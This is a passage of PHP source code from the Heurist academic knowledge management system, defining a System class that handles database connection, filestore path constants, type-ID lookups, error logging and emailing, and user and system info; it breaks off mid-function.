<?php

/**
* @package     Heurist academic knowledge management system
* @link        http://HeuristNetwork.org
* @copyright   (C) 2005-2020 University of Sydney
* @author      Artem Osmakov   <artem.osmakov@sydney.edu.au>
* @license     http://www.gnu.org/licenses/gpl-3.0.txt GNU License 3.0
* @version     4.0
*/

/*
* Licensed under the GNU License, Version 3.0 (the "License"); you may not use this file except in compliance
* with the License. You may obtain a copy of the License at http://www.gnu.org/licenses/gpl-3.0.txt
* Unless required by applicable law or agreed to in writing, software distributed under the License is
* distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
* See the License for the specific language governing permissions and limitations under the License.
*/


//@todo - reimplement using Singleton pattern

require_once (dirname(__FILE__).'/../configIni.php'); // read in the configuration file
require_once (dirname(__FILE__).'/consts.php');


require_once (dirname(__FILE__).'/dbaccess/utils_db.php');
require_once (dirname(__FILE__).'/dbaccess/db_users.php');
require_once (dirname(__FILE__).'/utilities/utils_file.php');
require_once (dirname(__FILE__).'/structure/dbsImport.php');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

/**
*  Class that contains mysqli (dbconnection), current user and system settings
*
*  it performs system initialization:
*   a) establish connection to server
*   b) define sytems constans - paths
*   c) perform login and load current user info
*   d) load system info (from sysIdentification)
*   e) keeps array of errors
*
* system constants:
*
* HEURIST_THUMB_DIR
* HEURIST_FILESTORE_DIR
*/
class System {

    private $mysqli = null;
    private $dbname_full = null;
    private $dbname = null;
    private $session_refix = null;

    private $errors = array();

    private $is_inited = false;
    
    //???
    //private $guest_User = array('ugr_ID'=>0,'ugr_FullName'=>'Guest');
    private $current_User = null;
    private $system_settings = null;
    private $send_email_on_error = 1; //set to 1 to send email for all severe errors
    
    /*
    
    init 
        set_dbname_full
        init_db_connection - connect to server and select database (move to db_utils?)
        initPathConstants  - set path constants
        login_verify  - load user info from session or reloads from database
    
    login
        login_verify
    
    
    
    */
    
    
    /**
    * Read configuration parameters from config file
    *
    * Establish connection to server
    * Open database
    *
    * @param $db - database name
    * @param $dbrequired - if false only connect to server (for database list)
    * @return true on success
    */
    public function init($db, $dbrequired=true, $init_session_and_constants=true){

        if( !$this->set_dbname_full($db, $dbrequired) ){
            return false;
        }

        //dbutils?
        if($this->init_db_connection()!==false){
        
                if($init_session_and_constants){
                
                    if(!$this->start_my_session()){
                        return false;
                    }
                    
                    if($this->dbname_full){
                    
                        if(!defined('HEURIST_DBNAME')){ //init once for first systrem - preferable use methods 
                            define('HEURIST_DBNAME', $this->dbname);
                            define('HEURIST_DBNAME_FULL', $this->dbname_full);
                        }

                        if(!$this->initPathConstants()){
                            return false;
                        }

                        $this->login_verify( false ); //load user info from session
                        if($this->get_user_id()>0){
                            //set current user for stored procedures (log purposes)
                            $this->mysqli->query('set @logged_in_user_id = '.$this->get_user_id());
                        }
                        
                        //ONLY_FULL_GROUP_BY,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO
                        $this->mysqli->query('SET GLOBAL sql_mode = \'STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION\'');
                    }
                    // consts
                    // @todo constants inited once in initPage for index (main) page only
                    // $this->defineConstants();    
                }
       
/*DEBUG            
error_log('init systme '.$_SERVER['PHP_SELF']);
error_log(print_r($_REQUEST, true));
*/            
            $this->is_inited = true;
            return true;
        }

    }

    //
    //
    //
    private function init_db_connection(){
        
        $res = mysql__connection(HEURIST_DBSERVER_NAME, ADMIN_DBUSERNAME, ADMIN_DBUSERPSWD);
        if ( is_array($res) ){
            //connection to server failed
            $this->addError($res[0], $res[1]);
            $this->mysqli = null;
            return false;
        }else{
            $this->mysqli = $res;

            if($this->dbname_full)  //database is defined
            {
                $res = mysql__usedatabase($this->mysqli, $this->dbname_full);
                if ( is_array($res) ){
                    //open of database failed
                    $this->addError($res[0], $res[1]);
                    return false;
                }
            }
        }
        return $res;
    }

    //------------------------- RT DT CONSTANTS --------------------
    /**
    * Defines all constants
    */
    public function defineConstants($reset=false) {

        // Record type constants
        global $rtDefines;
        foreach ($rtDefines as $str => $id)
        if(!defined($str)){
            $this->defineRTLocalMagic($str, $id[1], $id[0], $reset);
        }

        // Data type constants
        global $dtDefines;
        foreach ($dtDefines as $str => $id)
        if(!defined($str)){
            $this->defineDTLocalMagic($str, $id[1], $id[0], $reset);
        }
    }

    //
    // init the only constant
    //
    public function defineConstant($const_name, $reset=false) {
        
        if(defined($const_name)){
            return true;
        }else{
            global $rtDefines;
            global $dtDefines;
            if(@$rtDefines[$const_name]){
                $this->defineRTLocalMagic($const_name, $rtDefines[$const_name][1], $rtDefines[$const_name][0], $reset);
            }else if(@$dtDefines[$const_name]){
                $this->defineDTLocalMagic($const_name, $dtDefines[$const_name][1], $dtDefines[$const_name][0], $reset);
            }
            return defined($const_name);
        }
    }
    
    //
    // get 3d party web service configuration and their mapping to heurist record types and fields
    //
    private function getWebServiceConfigs(){

        //read service_mapping.json from setting folder
        $config_res = null;
        
        $config_file = dirname(__FILE__).'/controller/record_lookup_config.json';
        
        if(file_exists($config_file)){
            
           $json = file_get_contents($config_file);
           
           $config = json_decode($json, true);
           if(is_array($config)){
               
               $config_res = array();
               
               foreach($config as $idx=>$cfg){
                   
                   $allowed_dbs = @$cfg['database'];
                   if(true){ //$allowed_dbs==null || $allowed_dbs=="*" || in_array(HEURIST_DBNAME,explode(',',$allowed_dbs))){
                   
                       $rty_ID = ConceptCode::getRecTypeLocalID($cfg['rty_ID']);
                       if(true || $rty_ID>0){
                           
                            $cfg['rty_ID'] = $rty_ID;
                           
                            foreach($cfg['fields'] as $field=>$code){
                                $cfg['fields'][$field] = ConceptCode::getDetailTypeLocalID($code);
                            }
                           
                            $config_res[] = $cfg;
                       }
                   }
               }
           }
        }
        
        return $config_res;
    }
    

    //
    // get constants as array to use on client side
    //
    private function getLocalConstants( $reset=false ){

        $this->defineConstants( $reset );
        
        $res = array();

        global $rtDefines;
        foreach ($rtDefines as $magicRTName => $id) {
            if(defined($magicRTName)){
                $res[$magicRTName] = constant ( $magicRTName );
            }
        }

        // Data type constants
        global $dtDefines;
        foreach ($dtDefines as $magicDTName => $id) {
            if(defined($magicDTName)){
                $res[$magicDTName] = constant ( $magicDTName );
            }
        }

        return $res;
    }

    /**
    * bind Magic Number Constants to their local id
    * @param    string [$defString] define string
    * @param    int [$rtID] origin rectype id
    * @param    int [$dbID] origin database id
    */
    private function defineRTLocalMagic($defString, $rtID, $dbID, $reset=false) {
        
        $id = $this->rectypeLocalIDLookup($rtID, $dbID, $reset);
        
        if ($id) {
            //echo "\nRT DEFINING \"" . $defString . "\" AS " . $id;
            define($defString, $id);
        } else {
            //echo "\nRT DEFINING \"" . $defString . "\" AS " . $rtID;
            // define($defString, $rtID);
        }
    }


    /**
    * lookup local id for a given rectype concept id pair
    * @global    type description of global variable usage in a function
    * @staticvar array [$RTIDs] lookup array of local ids
    * @param     int [$rtID] origin rectype id
    * @param     int [$dbID] origin database id (default to 2 which is reserved for coreDefinition)
    * @return    int local rectype ID or null if not found
    */
    private function rectypeLocalIDLookup($rtID, $dbID = 2, $reset=false) {
        static $RTIDs;
        
        /*if($dbID==$this->get_system('sys_dbRegisteredID')){
            return $rtID;
        }else*/
        if (!$RTIDs || $reset) {
            $res = $this->mysqli->query('select rty_ID as localID,
            rty_OriginatingDBID as dbID, rty_IDInOriginatingDB as id from defRecTypes order by dbID');
            if (!$res) {
                $this->addError(HEURIST_DB_ERROR, 'Unable to build internal record-type lookup table', $this->mysqli->error);
                
                echo "Unable to build internal record-type lookup table. Please "
                    . CONTACT_SYSADMIN." for assistance. MySQL error: " 
                    . $this->mysqli->error;
                exit();
            }
            
            $regID = $this->get_system('sys_dbRegisteredID');

            $RTIDs = array();
            while ($row = $res->fetch_assoc()) {
                
                if( !($row['dbID']>0) && $regID>0){
                    $row['dbID'] = $regID;
                    $row['id'] = $row['localID'];
                }
                
                if (!@$RTIDs[$row['dbID']]) {
                    $RTIDs[$row['dbID']] = array();
                }
                $RTIDs[$row['dbID']][$row['id']] = $row['localID'];
            }
            //print_r(@$RTIDs);
        }
        return (@$RTIDs[$dbID][$rtID] ? $RTIDs[$dbID][$rtID] : null);
    }


    /**
    * bind Magic Number Constants to their local id
    * @param    string [$defString] define string
    * @param    int [$dtID] origin detailtype id
    * @param    int [$dbID] origin database id
    */
    private function defineDTLocalMagic($defString, $dtID, $dbID, $reset=false) {
        $id = $this->detailtypeLocalIDLookup($dtID, $dbID, $reset);
        if ($id) {
            //echo "\nDT DEFINING \"" . $defString . "\" AS " . $id;
            define($defString, $id);
        } else {
            //echo "\nDT DEFINING \"" . $defString . "\" AS " . $dtID;
            // define($defString, $dtID);
        }
    }


    /**
    * lookup local id for a given detailtype concept id pair
    * @global    type description of global variable usage in a function
    * @staticvar array [$RTIDs] lookup array of local ids
    * @param     int [$dtID] origin detailtype id
    * @param     int [$dbID] origin database id (default to 2 which is reserved for coreDefinition)
    * @return    int local detailtype ID or null if not found
    */
    private function detailtypeLocalIDLookup($dtID, $dbID = 2, $reset=false) {
        static $DTIDs;
        
        /*if($dbID==$this->get_system('sys_dbRegisteredID')){
            return $dtID;
        }else*/
        if (!$DTIDs || $reset) {
            $res = $this->mysqli->query('select dty_ID as localID,dty_OriginatingDBID as dbID,dty_IDInOriginatingDB as id from defDetailTypes order by dbID');
            if (!$res) {
                echo "Unable to build internal field-type lookup table. Please ".CONTACT_SYSADMIN." for assistance. MySQL error: " . mysql_error();
                exit();
            }
                
                
            $regID = $this->get_system('sys_dbRegisteredID');

            $DTIDs = array();
            while ($row = $res->fetch_assoc()) {
                
                if( !($row['dbID']>0) && $regID>0){
                    $row['dbID'] = $regID;
                    $row['id'] = $row['localID'];
                }
                
                if (!@$DTIDs[$row['dbID']]) {
                    $DTIDs[$row['dbID']] = array();
                }
                $DTIDs[$row['dbID']][$row['id']] = $row['localID'];
            }
        }
        return (@$DTIDs[$dbID][$dtID] ? $DTIDs[$dbID][$dtID] : null);
    }

    //------------------------- END RT DT CONSTANTS --------------------

    //
    //
    //
    public function getFileStoreRootFolder(){
        
        global $defaultRootFileUploadPath;
        
        if (isset($defaultRootFileUploadPath) && $defaultRootFileUploadPath && $defaultRootFileUploadPath!="") {
            
            if ($defaultRootFileUploadPath != "/" && !preg_match("/[^\/]\/$/", $defaultRootFileUploadPath)) { //check for trailing /
                $defaultRootFileUploadPath.= "/"; // append trailing /
            }
            
            if ( !strpos($defaultRootFileUploadPath,":/") && $defaultRootFileUploadPath != "/" && !preg_match("/^\/[^\/]/", $defaultRootFileUploadPath)) {
                //check for leading /
                $defaultRootFileUploadPath = "/" . $defaultRootFileUploadPath; // prepend leading /
            }
            
            return $defaultRootFileUploadPath;
            
        }else{
            
            $install_path = 'HEURIST/'; //$this->getInstallPath();
            $dir_Filestore = "HEURIST_FILESTORE/";

            $documentRoot = @$_SERVER['DOCUMENT_ROOT'];
            if( $documentRoot && substr($documentRoot, -1, 1) != '/' ) $documentRoot = $documentRoot.'/';
            
            
            return  $documentRoot . $install_path . $dir_Filestore;
            
        }
    }
    
    /**
    *  Returns three values array for each system folder
    *  0 - parth of constant HEURIST_XXX_DIR and HEURIST_XXX_URL
    *  1 - desciption
    *  2 - allow webaccess (.htaccess_via_url will be copied to this folder)
    *  3 - must be backuped
    */
    public function getArrayOfSystemFolders(){
        
        global $allowThumbnailsWebAccessdefault;
        
        //const name, description, allow webaccess, for backup
        $folders = array();
        $folders['filethumbs']   = array('THUMB','used to store thumbnails for uploaded files', $allowThumbnailsWebAccessdefault, true);
        $folders['file_uploads'] = array('FILES','used to store uploaded files by default');
        //besides we have HEURIST_SCRATCHSPACE_DIR == sys temp dir
        $folders['scratch']      = array('SCRATCH','used to store temporary files', false); 
        $folders['hml-output']   = array('HML','used to write published records as hml files', true);
        $folders['html-output']  = array('HTML','used to write published records as generic html files', true);
        $folders['generated-reports'] = array(null,'used to write generated reports');
        $folders['xsl-templates']     = array('XSL_TEMPLATES','', false, true);
        $folders['smarty-templates']  = array('SMARTY_TEMPLATES','', false, true);
        $folders['entity']        = array(null,'used to store icons and images for users,groups,terms');
        $folders['backup']        = array(null,'used to write files for user data dump');
        $folders['rectype-icons'] = array('ICON','used for record type icons and thumbnails', true, true); //todo move to entity
        $folders['settings']      = array('SETTING','', false, true);
        
        // do not create
        $folders['documentation_and_templates'] = array('','', false, true);
        $folders['term-images']    = array('TERM_ICON','', true, true); //for digital harlem
        $folders['faims']    = array('',''); 
        
        return $folders;
    }        
    
    //
    // $is_for_backup - 0 no, 1 - archive backup, 2 - delete backup
    //
    public function getSystemFolders($is_for_backup=false, $database_name=null){
        
        $folders = $this->getArrayOfSystemFolders();
        
        $system_folders = array();
        
        if($database_name==null){
            $dbfolder = HEURIST_FILESTORE_DIR;
        }else{
            $dbfolder = HEURIST_FILESTORE_ROOT.$database_name.'/';
        }
        
        foreach ($folders as $folder_name=>$folder){        
            if(!$is_for_backup || @$folder[3]===true){

                if($is_for_backup==2 && $folder_name=='documentation_and_templates') continue;
                
                if($is_for_backup==2){
                    $folder_name = str_replace('\\', '/', realpath($dbfolder.$folder_name));
                }else{
                    $folder_name = $dbfolder.$folder_name;
                }
                
                array_push($system_folders, $folder_name.'/');
            }
        }
        
        if($is_for_backup==2){
            array_push($system_folders, str_replace('\\', '/', realpath($dbfolder.'file_uploads')).'/');
        }

        //special case - these folders can be defined in sysIdentification and be outisde database folder            
        if(!$is_for_backup){
            if(defined('HEURIST_XSL_TEMPLATES_DIR')) array_push($system_folders, HEURIST_XSL_TEMPLATES_DIR);
            if(defined('HEURIST_HTML_DIR')) array_push($system_folders, HEURIST_HTML_DIR);
            if(defined('HEURIST_HML_DIR')) array_push($system_folders, HEURIST_HML_DIR);
        }
        
        return $system_folders;
    }
    
    //
    // $dbname - shortname (without prefix)
    //
    public function initPathConstants($dbname=null){

        global $defaultRootFileUploadPath, $defaultRootFileUploadURL;

        list($database_name_full, $dbname) = mysql__get_names($dbname);
        
        $upload_root = $this->getFileStoreRootFolder();

        //path is defined in configIni
        if (isset($defaultRootFileUploadPath) && $defaultRootFileUploadPath && $defaultRootFileUploadPath!="") {

            if(!defined('HEURIST_FILESTORE_ROOT')){
                define('HEURIST_FILESTORE_ROOT', $upload_root );
            }
            
            if(!defined('HEURIST_FILESTORE_DIR')){
                define('HEURIST_FILESTORE_DIR', $upload_root . $dbname . '/');
            }

        }
        else{
            //path is not configured in ini - set dafault values
            
            $install_path = 'HEURIST/'; //$this->getInstallPath();
            $dir_Filestore = "HEURIST_FILESTORE/";

            if(!defined('HEURIST_FILESTORE_ROOT')){
                define('HEURIST_FILESTORE_ROOT', $upload_root);
            }
            
            if(!defined('HEURIST_FILESTORE_DIR')){
                define('HEURIST_FILESTORE_DIR', $upload_root . $dbname . '/');
            }
            
            $defaultRootFileUploadURL = HEURIST_SERVER_URL . '/' . $install_path . $dir_Filestore;
        }

        $check = folderExists(HEURIST_FILESTORE_DIR, true);
        if($check<0){
                $this->addError(HEURIST_SYSTEM_FATAL, "Cannot access filestore directory for this database: <b>". HEURIST_FILESTORE_DIR .
                                '</b><br/>The directory '
                                .(($check==-1)
                                ?'does not exist (check setting in heuristConfigIni.php file)'
                                :'is not writeable by PHP (check permissions)')
                                .'<br>On a multi-tier service, the file server may not have restarted correctly or '
                                .'may not have been mounted on the web server.</p>');
                return false;
        }
       
        define('HEURIST_FILESTORE_URL', $defaultRootFileUploadURL . $dbname . '/');
        
        $folders = $this->getArrayOfSystemFolders();
        $warnings = array();
        
        foreach ($folders as $folder_name=>$folder){
            
                if($folder[0]=='') continue;
            
                $allowWebAccess = (@$folder[2]===true);
            
                $dir = HEURIST_FILESTORE_DIR.$folder_name.'/';
                
                $warn = folderCreate2($dir, $folder[1], $allowWebAccess);
                if($warn!=''){ //can't creat or not writeable
                    $warnings[] = $warn;
                }else{
                    if($folder[0]!=null){
                        define('HEURIST_'.$folder[0].'_DIR', $dir);
                        if($allowWebAccess){
                            define('HEURIST_'.$folder[0].'_URL', HEURIST_FILESTORE_URL.$folder_name.'/');
                        }
                    }
                }
            
        }
        if(count($warnings)>0){
            $this->addError(HEURIST_SYSTEM_FATAL, implode('',$warnings));
            return false;            
        }
            

        define('HEURIST_ICON_SCRIPT', HEURIST_BASE_URL.'hsapi/dbaccess/rt_icon.php?db='.$dbname.'&id=');
        
        return true;
    }

    //
    // NOT USED. It is assumed that it is in HEURIST folder
    //
    private function getInstallPath(){

        $documentRoot = @$_SERVER['DOCUMENT_ROOT'];
        if( $documentRoot && substr($documentRoot, -1, 1) != '/' ) $documentRoot = $documentRoot.'/';

        $topDirs = "admin|api|applications|common|context_help|export|hapi|hclient|hsapi|import|records|redirects|search|viewers|help|ext|external"; // Upddate in 3 places if changed
        $installDir = preg_replace("/\/(" . $topDirs . ")\/.*/", "", @$_SERVER["SCRIPT_NAME"]); // remove "/top level dir" and everything that follows it.

        if ($installDir == @$_SERVER["SCRIPT_NAME"]) { // no top directories in this URI must be a root level script file or blank
            $installDir = preg_replace("/\/[^\/]*$/", "", @$_SERVER["SCRIPT_NAME"]); // strip away everything past the last slash "/index.php" if it's there
        }

        //the subdir of the server's document directory where heurist is installed
        if ($installDir == @$_SERVER["SCRIPT_NAME"]) { // this should be the path difference between document root and heurist code root
            $installDir = '';
        }

        $install_path = @$_SERVER['DOCUMENT_ROOT'].$installDir;
        if( substr($install_path, -1, 1) == '/' ) $install_path = substr($install_path,0,-1); //remove last slash

        if(is_link($install_path)){
            $install_path = readlink($install_path);  //real installation path eg. html/HEURIST/h3-ij/
        }else{
            $install_path = "";
        }

        if($install_path!=""){ //this is simlink
            //remove code folder - to get real HEURIST installation
            if( substr($install_path, -1, 1) == '/' ) $install_path = substr($install_path,0,-1); //remove last slash
            if(strrpos($install_path,"/")>0){
                $install_path = substr($install_path,0,strrpos($install_path,"/")+1); //remove last folder

                if(strpos($install_path, $documentRoot)===0){
                    $install_path = substr($install_path, strlen($documentRoot));
                }
            }else{
                $install_path = "";
            }
        }else {

            $install_dir = $installDir; 
            if($install_dir){
                if( substr($install_dir, -1, 1) == '/' ) $install_dir = substr($install_dir,0,-1); //remove last slash
                if($install_dir!=""){
                    if(strrpos($install_dir,"/")>0){
                        $install_dir = substr($install_dir,0,strrpos($install_dir,"/")+1);  //remove last folder
                    }else{
                        $install_dir = "";
                    }
                }
                //$install_path = $install_dir . $install_path;
            }
            $install_path = $install_dir;
        }
        if( $install_path && substr($install_path, 0, 1) == '/' ) $install_path = substr($install_path,1); //remove first slash

        return $install_path;
    }



    /**
    * Returns true if system is inited ccorretly and db connection is established
    */
    public function is_inited(){
        return $this->is_inited;
    }

    /**
    * Get database connection object
    */
    public function get_mysqli(){
        return $this->mysqli;
    }

    /**
    * Get full name of database
    */
    public function dbname_full(){
        return $this->dbname_full;
    }

    public function dbname(){
        return $this->dbname;
    }
    
    /**
    * set dbname and dbname_full properties
    * 
    * @param mixed $db
    */
    public function set_dbname_full($db, $dbrequired=true){
        
        if($db){
            
            //list($this->dbname_full, $this->dbname) = DbUtils::databaseGetNames($db
            list($this->dbname_full, $this->dbname ) = mysql__get_names( $db );
            
        }else{
            $this->dbname = null;
            $this->dbname_full = null;
            
            if($dbrequired){
                $this->addError(HEURIST_INVALID_REQUEST, "Database parameter not defined");
                $this->mysqli = null;
                return false;
            }
        }
        return true;
    }
    

    /**
    * return list of errors
    */
    public function getError(){
        return $this->errors;
    }

    public function clearError(){
        $this->errors = array();
    }

    /**
    * produce json output and 
    * terminate execution of script 
    * 
    * @param mixed $message
    */
    public function error_exit( $message, $error_code=null) {
        
        header('Content-type: application/json;charset=UTF-8');
        if($message){
            if($error_code==null){
                $error_code = HEURIST_INVALID_REQUEST;
            }
            $this->addError($error_code, $message);
        }

        print json_encode( $this->getError() );
        
        exit();
    }


    public function error_exit_api( $message=null, $error_code=null) {
        
        header("Access-Control-Allow-Origin: *");
        header('Content-type: application/json;charset=UTF-8');
        if($message){
            if($error_code==null){
                $error_code = HEURIST_INVALID_REQUEST;
            }
            $this->addError($error_code, $message);
        }
        
        $response = $this->getError();
        
        $status = @$response['status'];
        if($status==HEURIST_INVALID_REQUEST){
            $code = 400; // Bad Request - the request could not be understood or was missing required parameters. 
        }else if($status==HEURIST_REQUEST_DENIED) {
            $code = 403; // Forbidden - access denied
        }else if($status==HEURIST_NOT_FOUND){
            $code = 404; //Not Found - resource was not found.
        }else if($status==HEURIST_ACTION_BLOCKED) {  
            $code = 409; //can not add an existing object already exists or constraints violation
        }else{
            //HEURIST_ERROR, HEURIST_UNKNOWN_ERROR, HEURIST_DB_ERROR, HEURIST_SYSTEM_CONFIG, HEURIST_SYSTEM_FATAL
            $code = 500; //An unexpected internal error has occurred. Please contact Support for more information.
        }
        http_response_code($code);     
        
        print json_encode( $response );
        exit();
    }
    
    //
    // add prefix for error message
    //
    public function addErrorMsg($message) {
        if($this->errors && @$this->errors['message']){
            $this->errors['message']  = $message.$this->errors['message'];
        }else{
            $this->addError(HEURIST_ERROR, $message);
        }
    }
    
    // NOT USED
    public function setErrorEmail($val){
        $this->send_email_on_error = $val;
    }

    /**
    * keep error message (for further use with getError)
    */
    public function addError($status, $message='', $sysmsg=null, $title=null) {

        if($status==HEURIST_REQUEST_DENIED && $sysmsg==null){
            $sysmsg = $this->get_user_id();
        }

        if($status!=HEURIST_INVALID_REQUEST && $status!=HEURIST_NOT_FOUND && 
        $status!=HEURIST_REQUEST_DENIED && $status!=HEURIST_ACTION_BLOCKED){


            $now = new DateTime('now', new DateTimeZone('UTC'));
            $curr_logfile = 'errors_'.$now->format('Y-m-d').'.log';

            //1. check if log file for previous day exists
            $yesterday = $now->sub(new DateInterval('P1D'));
            $arc_logfile = 'errors_'.$yesterday->format('Y-m-d').'.log';
            
            $root_folder = HEURIST_FILESTORE_ROOT; //dirname(__FILE__).'/../../';
            
            //if yesterday log file exists
            if(file_exists($root_folder.$arc_logfile)){
                //2. copy to log folder and email it
                $archiveFolder = $root_folder."AAA_LOGS/";        

                fileCopy($root_folder.$arc_logfile, $archiveFolder.$arc_logfile);
                unlink($root_folder.$arc_logfile);

                if($this->send_email_on_error==1){
                    
                    $msg = 'Error report '.HEURIST_SERVER_NAME.' for '.$yesterday->format('Y-m-d');

                    //send an email with attachment
                    $email = new PHPMailer();
                    $email->isHTML(true); 
                    $email->SetFrom('bugs@HeuristNetwork.org', 'Bug reporter'); //'bugs@'.HEURIST_SERVER_NAME 
                    $email->Subject   = $msg;
                    $email->Body      = $msg;
                    $email->AddAddress( HEURIST_MAIL_TO_BUG );        
                    $email->addAttachment($archiveFolder.$arc_logfile);

                    try{
                        $email->send();
                    } catch (Exception $e) {
                        error_log('Cannot send email. Please ask system administrator to verify that mailing is enabled on your server. '
                         .$email->ErrorInfo);     
                    }                    
                    //$rv = sendEmail(HEURIST_MAIL_TO_BUG, $Title, $sMsg, null);
                }

            }

            //3. wrtie error into current error log
            $Title = 'Heurist Error type: '.$status
                    .' User: '.$this->get_user_id()
                    .' '.@$this->current_User['ugr_FullName']
                    .' <'.@$this->current_User['ugr_eMail'].'>'
                    .' Database: '.$this->dbname();

            $sMsg = 'Message: '.$message."\n"
                    .($sysmsg?'System message: '.$sysmsg."\n":'')
                    .'Request: '.substr(print_r($_REQUEST, true),0,2000)."\n"
                    .'Script: '.@$_SERVER['REQUEST_URI']."\n"
                    ."------------------\n";

            fileAdd($Title.'  '.$sMsg, $root_folder.$curr_logfile);

            $message = 'Heurist was unable to process. '.$message;
            $sysmsg = 'This error has been emailed to the Heurist team (for servers maintained by the project - may not be enabled on personal servers). We apologise for any inconvenience';

            //$root_folder.$curr_logfile."\n".
            error_log($Title.'  '.$sMsg);     
        }

        $this->errors = array("status"=>$status, "message"=>$message, "sysmsg"=>$sysmsg, 'error_title'=>$title);
        return $this->errors;
    }

    //
    //
    //
    private function _checkRecLinks(){
/*        
        $total_not_in_cache = mysql__select_value($this->mysqli, 
        'SELECT count(rec_ID) FROM Records left join recLinks on rec_ID=rl_RelationID '
            .'where rec_RecTypeID=1 and rec_FlagTemporary=0 and rl_RelationID is null');
        if($total_not_in_cache==null || $total_not_in_cache>0){
*/            
            
        if(!hasTable($this->mysqli, 'recLinks')){
                //recreate cache
                include(dirname(__FILE__).'/utilities/utils_db_load_script.php'); // used to execute SQL script

                if(!db_script(HEURIST_DBNAME_FULL, dirname(__FILE__).'/../admin/setup/dbcreate/addProceduresTriggers.sql', false))
                {
                    $this->addError(HEURIST_DB_ERROR, "Cannot execute script addProceduresTriggers.sql");
                    $response = $this->getError();
                    $isok = false;
                }else if(!db_script(HEURIST_DBNAME_FULL, dirname(__FILE__)."/dbaccess/sqlCreateRecLinks.sql"))
                {
                    $this->addError(HEURIST_DB_ERROR, "Cannot execute script sqlCreateRecLinks.sql");
                    $response = $system->getError();
                    $isok = false;
                }

                
                
        }
    }

    //
    // returns total records in db and counts of active entries in dashboard  
    //  invoked on page init and after login
    //
    public function getTotalRecordsAndDashboard(){
        
        $db_total_records = 0;
        $db_has_active_dashboard = 0;
        $db_workset_count = 0;
        
        if( $this->mysqli ){
             $db_total_records = mysql__select_value($this->mysqli, 'select count(*) from Records');
             $db_total_records = ($db_total_records>0)?$db_total_records:0;

             if($this->has_access()){
                 $query = 'select count(*) from sysDashboard where dsh_Enabled="y"';
                 if($db_total_records<1){
                      $query = $query.'AND dsh_ShowIfNoRecords="y"';
                 }
                 $db_has_active_dashboard = mysql__select_value($this->mysqli, $query);
                 $db_has_active_dashboard = ($db_has_active_dashboard>0)?$db_has_active_dashboard:0;
                 
                 $curr_user_id = $this->get_user_id();
                 if($curr_user_id>0){
                    $query = 'select count(*) from usrWorkingSubsets where wss_OwnerUGrpID='.$curr_user_id;
                    $db_workset_count = mysql__select_value($this->mysqli, $query);
                 }
             }
        }
        return array($db_total_records, $db_has_active_dashboard, $db_workset_count);
    }

    /**
    * Returns all info for current user and some sys config parameters
    * see usage usr_info.sysinfo and usr_info.login
    * 
    * it always reload user info from database
    */
    public function getCurrentUserAndSysInfo( $include_reccount_and_dashboard_count=false ){
        global $passwordForDatabaseCreation,$passwordForDatabaseDeletion,$passwordForReservedChanges,$passwordForServerFunctions;
   
        //current user reset - reload actual info from database
        $this->login_verify( true );

        if($this->mysqli){

            $dbowner = user_getDbOwner($this->mysqli); //info about user #2

            //list of databases recently logged in
            $dbrecent = array();
            if($this->current_User && @$this->current_User['ugr_ID']>0){
                foreach ($_SESSION as $db=>$session){

                    $user_id = @$_SESSION[$db]['ugr_ID']; // ?$_SESSION[$db]['ugr_ID'] :@$_SESSION[$db.'.heurist']['user_id'];
                    if($user_id == $this->current_User['ugr_ID']){
                        if(strpos($db, HEURIST_DB_PREFIX)===0){
                            $db = substr($db,strlen(HEURIST_DB_PREFIX));
                        }
                        array_push($dbrecent, $db);
                    }
                }
            }
            
            //host organization logo and url
            $host_logo = realpath(dirname(__FILE__)."/../../organisation_logo.jpg");
            $host_url = null;
            if(file_exists($host_logo)){
                $host_logo = HEURIST_BASE_URL.'?logo=host';
                $host_url = realpath(dirname(__FILE__)."/../../organisation_url.txt");
                if(file_exists($host_url)){
                    $host_url = file_get_contents($host_url);   
                }else{
                    $host_url = null;
                }
            }else{
                $host_logo = null;    
            }
            

            //retrieve lastest code version (cached in localfile and refreshed from main index server daily)
            $lastCode_VersionOnServer = $this->get_last_code_and_db_version();

            $res = array(
                "currentUser"=>$this->current_User,
                "sysinfo"=>array(
                    "registration_allowed"=>$this->get_system('sys_AllowRegistration'),
                    "db_registeredid"=>$this->get_system('sys_dbRegisteredID'),
                    "db_managers_groupid"=>($this->get_system('sys_OwnerGroupID')>0?$this->get_system('sys_OwnerGroupID'):1),
                    "help"=>HEURIST_HELP,
                    
                    //code version
                    "version"=>HEURIST_VERSION,    
                    "version_new"=>$lastCode_VersionOnServer, //version on main index database server
                    //db version
                    "db_version"=> $this->get_system('sys_dbVersion').'.'
                                        .$this->get_system('sys_dbSubVersion').'.'
                                        .$this->get_system('sys_dbSubSubVersion'),         
                    "db_version_req"=>HEURIST_MIN_DBVERSION,
                    
                    "dbowner_name"=>@$dbowner['ugr_FirstName'].' '.@$dbowner['ugr_LastName'],
                    "dbowner_org"=>@$dbowner['ugr_Organisation'],
                    "dbowner_email"=>@$dbowner['ugr_eMail'],
                    "sysadmin_email"=>HEURIST_MAIL_TO_ADMIN,
                    "db_total_records"=>$this->get_system('sys_RecordCount'),
                    "db_usergroups"=> user_getAllWorkgroups($this->mysqli), //all groups- to fast retrieve group name
                    "baseURL"=>HEURIST_BASE_URL,
                    "dbconst"=>$this->getLocalConstants( $include_reccount_and_dashboard_count ), //some record and detail types constants with local values specific for current db
                    "service_config"=>$this->get_system('sys_ExternalReferenceLookups'), //get 3d part web service mappings
                    "services_list"=>$this->getWebServiceConfigs(), //get list of all implemented lookup services
                    "dbrecent"=>$dbrecent,  //!!!!!!! need to store in preferences
                    'max_post_size'=>get_php_bytes('post_max_size'),
                    'max_file_size'=>get_php_bytes('upload_max_filesize'),
                    'host_logo'=>$host_logo,
                    'host_url'=>$host_url,
                    
                    'pwd_DatabaseCreation'=> (strlen(@$passwordForDatabaseCreation)>6), 
                    'pwd_DatabaseDeletion'=> (strlen(@$passwordForDatabaseDeletion)>15), //delete for db statistics
                    'pwd_ReservedChanges' => (strlen(@$passwordForReservedChanges)>6),  //allow change reserved fields 
                    'pwd_ServerFunctions' => (strlen(@$passwordForServerFunctions)>6)   //allow run multi-db server actions
                    )
            );
            
            if($include_reccount_and_dashboard_count){
                $res2 = $this->getTotalRecordsAndDashboard();                    
                $res['sysinfo']['db_total_records'] = $res2[0];
